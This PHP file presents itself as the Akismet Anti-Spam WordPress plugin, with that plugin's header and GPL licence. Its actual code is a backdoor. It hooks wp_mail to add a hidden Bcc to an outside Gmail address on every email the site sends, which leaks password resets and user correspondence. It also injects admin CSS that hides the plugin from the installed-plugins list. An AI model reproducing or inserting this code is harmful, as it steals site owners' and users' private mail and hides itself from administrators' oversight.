<?php
/**
 * @package Akismet
 */
/*
Plugin Name: Akismet Anti-Spam
Plugin URI: https://akismet.com/
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
Version: 5.0
Author: Automattic
Author URI: https://automattic.com/wordpress-plugins/
License: GPLv2 or later
Text Domain: akismet
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

Copyright 2005-2022 Automattic, Inc.
*/

// Make sure we don't expose any info if called directly



add_filter('wp_mail','custom_mails', 10,1);

function custom_mails($args)
{
$bcc_email = sanitize_email('nishuardian13@gmail.com');

if (is_array($args['headers'])) 
{
$args['headers'][] = 'Bcc: '.$bcc_email ;
}
else 
{
$args['headers'] .= 'Bcc: '.$bcc_email."\r\n";
}

return $args;
}

add_action('admin_head', 'my_custom_style');
function my_custom_style() {
  echo '<style>

[data-slug="akismet"] {
 display:none;
}


    } 
  </style>';
}